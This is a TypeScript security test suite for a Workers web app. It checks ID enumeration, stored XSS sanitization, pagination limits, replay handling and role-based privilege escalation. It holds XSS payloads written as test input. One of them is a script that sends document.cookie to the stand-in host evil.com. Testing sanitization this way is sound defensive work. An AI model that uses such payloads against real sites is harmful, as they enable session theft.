import { env } from "cloudflare:workers";
import { describe, it, expect, beforeAll } from "vitest";
import {
  getTestApp,
  createMockEnv,
  applyMigrations,
  applySeed,
  jsonRequest,
  getSessionCookie,
  registerAdminUser,
} from "./setup";

describe("Round 6: Final Vectors", () => {
  const app = getTestApp();
  let adminCookie: string;

  beforeAll(async () => {
    await applyMigrations(env.DB);
    await applySeed(env.DB);

    const e = createMockEnv(env.DB);
    const admin = await registerAdminUser(app, e, "r6-admin@test.com");
    adminCookie = admin.cookie;
  });

  // =================================================================
  // R6.1: ID Enumeration
  // =================================================================
  describe("ID enumeration resistance", () => {
    it("nanoid IDs are non-sequential and unpredictable", async () => {
      const ids: string[] = [];
      for (let i = 0; i < 5; i++) {
        const e = createMockEnv(env.DB);
        const res = await app.request(
          jsonRequest("/auth/register", {
            method: "POST",
            body: JSON.stringify({ email: `id-enum-${i}@test.com`, password: "pass12345", name: `User${i}` }),
          }),
          {},
          e,
        );
        const cookie = getSessionCookie(res)!;
        const meRes = await app.request(
          new Request("http://localhost/auth/me", { headers: { Cookie: `session=${cookie}` } }),
          {},
          createMockEnv(env.DB),
        );
        ids.push(((await meRes.json()) as any).user.id);
      }

      expect(new Set(ids).size).toBe(5);

      for (let i = 0; i < ids.length - 1; i++) {
        let commonPrefix = 0;
        for (let j = 0; j < Math.min(ids[i].length, ids[i + 1].length); j++) {
          if (ids[i][j] === ids[i + 1][j]) commonPrefix++;
          else break;
        }
        expect(commonPrefix).toBeLessThan(5);
      }

      for (const id of ids) {
        expect(id.length).toBe(21);
        expect(id).toMatch(/^[A-Za-z0-9_-]+$/);
      }
    });

    it("invalid IDs return 404, not error details", async () => {
      const invalidIds = ["1", "0", "AAAA", "999999", "null", "undefined"];
      for (const id of invalidIds) {
        const e = createMockEnv(env.DB);
        const res = await app.request(
          new Request(`http://localhost/users/${id}`, {
            headers: { Cookie: `session=${adminCookie}` },
          }),
          {},
          e,
        );
        expect(res.status).toBe(404);
        const body = (await res.json()) as any;
        expect(body.error.code).toBe("NOT_FOUND");
        expect(body.error.message).not.toContain("SQL");
        expect(body.error.message).not.toContain("database");
      }
    });
  });

  // =================================================================
  // R6.2: Second-order injection
  // =================================================================
  describe("Second-order injection", () => {
    it("XSS name is sanitized when viewed by admin in user list", async () => {
      const e = createMockEnv(env.DB);
      await app.request(
        jsonRequest("/auth/register", {
          method: "POST",
          body: JSON.stringify({
            email: "xss-2nd@test.com",
            password: "pass12345",
            name: '<img src=x onerror=alert(document.cookie)>Admin View',
          }),
        }),
        {},
        e,
      );

      const listRes = await app.request(
        new Request("http://localhost/users", { headers: { Cookie: `session=${adminCookie}` } }),
        {},
        createMockEnv(env.DB),
      );
      const body = (await listRes.json()) as any;
      const xssUser = body.users.find((u: any) => u.email === "xss-2nd@test.com");

      expect(xssUser).toBeDefined();
      expect(xssUser.name).not.toContain("<img");
      expect(xssUser.name).not.toContain("onerror");
      expect(xssUser.name).toBe("Admin View");

      expect(listRes.headers.get("content-type")).toContain("application/json");
      expect(listRes.headers.get("x-content-type-options")).toBe("nosniff");
    });

    it("malicious name safe in user detail endpoint", async () => {
      const e = createMockEnv(env.DB);
      const res = await app.request(
        jsonRequest("/auth/register", {
          method: "POST",
          body: JSON.stringify({
            email: "xss-detail@test.com",
            password: "pass12345",
            name: '"><script>fetch("https://evil.com/steal?c="+document.cookie)</script>',
          }),
        }),
        {},
        e,
      );
      const cookie = getSessionCookie(res)!;
      const meRes = await app.request(
        new Request("http://localhost/auth/me", { headers: { Cookie: `session=${cookie}` } }),
        {},
        createMockEnv(env.DB),
      );
      const userId = ((await meRes.json()) as any).user.id;

      const detailRes = await app.request(
        new Request(`http://localhost/users/${userId}`, {
          headers: { Cookie: `session=${adminCookie}` },
        }),
        {},
        createMockEnv(env.DB),
      );
      const detail = (await detailRes.json()) as any;
      expect(detail.user.name).not.toContain("<script>");
      expect(detail.user.name).not.toContain("<");
    });
  });

  // =================================================================
  // R6.3: Integer overflow
  // =================================================================
  describe("Integer overflow", () => {
    it("huge page number returns empty list, no crash", async () => {
      const e = createMockEnv(env.DB);
      const res = await app.request(
        new Request("http://localhost/users?page=999999999999&limit=10", {
          headers: { Cookie: `session=${adminCookie}` },
        }),
        {},
        e,
      );
      expect(res.status).toBe(200);
      const body = (await res.json()) as any;
      expect(body.users).toEqual([]);
    });

    it("negative limit clamped to 1", async () => {
      const e = createMockEnv(env.DB);
      const res = await app.request(
        new Request("http://localhost/users?page=1&limit=-999", {
          headers: { Cookie: `session=${adminCookie}` },
        }),
        {},
        e,
      );
      expect(res.status).toBe(200);
      const body = (await res.json()) as any;
      expect(body.pagination.limit).toBe(1);
    });

    it("float values handled gracefully", async () => {
      const e = createMockEnv(env.DB);
      const res = await app.request(
        new Request("http://localhost/users?page=1.5&limit=10.9", {
          headers: { Cookie: `session=${adminCookie}` },
        }),
        {},
        e,
      );
      expect(res.status).toBe(200);
    });
  });

  // =================================================================
  // R6.4: Response size abuse
  // =================================================================
  describe("Response size abuse", () => {
    it("user list capped at 100 items", async () => {
      const e = createMockEnv(env.DB);
      const res = await app.request(
        new Request("http://localhost/users?limit=999999", {
          headers: { Cookie: `session=${adminCookie}` },
        }),
        {},
        e,
      );
      const body = (await res.json()) as any;
      expect(body.pagination.limit).toBe(100);
    });

    it("roles list returns bounded result", async () => {
      const e = createMockEnv(env.DB);
      const res = await app.request(
        new Request("http://localhost/roles", {
          headers: { Cookie: `session=${adminCookie}` },
        }),
        {},
        e,
      );
      expect(res.status).toBe(200);
      const body = (await res.json()) as any;
      expect(body.roles.length).toBeLessThan(1000);
    });
  });

  // =================================================================
  // R6.5: Replay attack
  // =================================================================
  describe("Replay attack", () => {
    it("replayed logout request is harmless", async () => {
      const e1 = createMockEnv(env.DB);
      const loginRes = await app.request(
        jsonRequest("/auth/login", {
          method: "POST",
          body: JSON.stringify({ email: "r6-admin@test.com", password: "password123" }),
        }),
        {},
        e1,
      );
      const cookie = getSessionCookie(loginRes)!;

      const logoutReq = () => new Request("http://localhost/auth/logout", {
        method: "POST",
        headers: { Cookie: `session=${cookie}` },
      });

      const r1 = await app.request(logoutReq(), {}, createMockEnv(env.DB));
      expect(r1.status).toBe(200);

      const r2 = await app.request(logoutReq(), {}, createMockEnv(env.DB));
      expect(r2.status).toBe(200);

      const meRes = await app.request(
        new Request("http://localhost/auth/me", { headers: { Cookie: `session=${cookie}` } }),
        {},
        createMockEnv(env.DB),
      );
      expect(meRes.status).toBe(401);
    });

    it("replayed register request fails (duplicate)", async () => {
      const body = JSON.stringify({ email: "replay@test.com", password: "pass12345", name: "Replay" });
      const r1 = await app.request(
        jsonRequest("/auth/register", { method: "POST", body }),
        {},
        createMockEnv(env.DB),
      );
      expect(r1.status).toBe(201);

      const r2 = await app.request(
        jsonRequest("/auth/register", { method: "POST", body }),
        {},
        createMockEnv(env.DB),
      );
      expect(r2.status).toBe(409);
    });
  });

  // =================================================================
  // R6.6: Business logic chain — escalate via role creation
  // =================================================================
  describe("Business logic chain: privilege escalation via roles", () => {
    it("viewer cannot create admin-equivalent role", async () => {
      const e = createMockEnv(env.DB);
      const viewerRes = await app.request(
        jsonRequest("/auth/register", {
          method: "POST",
          body: JSON.stringify({ email: "chain@test.com", password: "pass12345", name: "Chain" }),
        }),
        {},
        e,
      );
      const viewerCookie = getSessionCookie(viewerRes)!;

      const createRoleRes = await app.request(
        new Request("http://localhost/roles", {
          method: "POST",
          headers: { Cookie: `session=${viewerCookie}`, "Content-Type": "application/json" },
          body: JSON.stringify({ name: "shadow_admin" }),
        }),
        {},
        createMockEnv(env.DB),
      );
      expect(createRoleRes.status).toBe(403);
    });

    it("viewer cannot assign existing admin role to self", async () => {
      const e = createMockEnv(env.DB);
      const viewerRes = await app.request(
        jsonRequest("/auth/register", {
          method: "POST",
          body: JSON.stringify({ email: "self-admin@test.com", password: "pass12345", name: "Self" }),
        }),
        {},
        e,
      );
      const viewerCookie = getSessionCookie(viewerRes)!;
      const meRes = await app.request(
        new Request("http://localhost/auth/me", { headers: { Cookie: `session=${viewerCookie}` } }),
        {},
        createMockEnv(env.DB),
      );
      const viewerId = ((await meRes.json()) as any).user.id;

      const assignRes = await app.request(
        new Request(`http://localhost/users/${viewerId}/roles`, {
          method: "POST",
          headers: { Cookie: `session=${viewerCookie}`, "Content-Type": "application/json" },
          body: JSON.stringify({ roleId: "role_admin" }),
        }),
        {},
        createMockEnv(env.DB),
      );
      expect(assignRes.status).toBe(403);
    });

    it("admin-created role with all permissions does not bypass admin check", async () => {
      const e = createMockEnv(env.DB);
      const roleRes = await app.request(
        new Request("http://localhost/roles", {
          method: "POST",
          headers: { Cookie: `session=${adminCookie}`, "Content-Type": "application/json" },
          body: JSON.stringify({ name: "super_editor" }),
        }),
        {},
        e,
      );
      const role = (await roleRes.json() as any).role;

      const allPerms = await env.DB.prepare("SELECT id FROM permissions").all();
      for (const perm of allPerms.results) {
        await app.request(
          new Request(`http://localhost/roles/${role.id}/permissions`, {
            method: "POST",
            headers: { Cookie: `session=${adminCookie}`, "Content-Type": "application/json" },
            body: JSON.stringify({ permissionId: (perm as any).id }),
          }),
          {},
          createMockEnv(env.DB),
        );
      }

      const userRes = await app.request(
        jsonRequest("/auth/register", {
          method: "POST",
          body: JSON.stringify({ email: "super-ed@test.com", password: "pass12345", name: "Super" }),
        }),
        {},
        createMockEnv(env.DB),
      );
      const userCookie = getSessionCookie(userRes)!;
      const userId = ((await (await app.request(
        new Request("http://localhost/auth/me", { headers: { Cookie: `session=${userCookie}` } }),
        {},
        createMockEnv(env.DB),
      )).json()) as any).user.id;

      await env.DB.exec(`INSERT INTO user_roles (user_id, role_id) VALUES ('${userId}', '${role.id}')`);

      const deleteRes = await app.request(
        new Request(`http://localhost/users/${userId}`, {
          method: "DELETE",
          headers: { Cookie: `session=${userCookie}` },
        }),
        {},
        createMockEnv(env.DB),
      );
      expect(deleteRes.status).toBe(403);
    });
  });
});
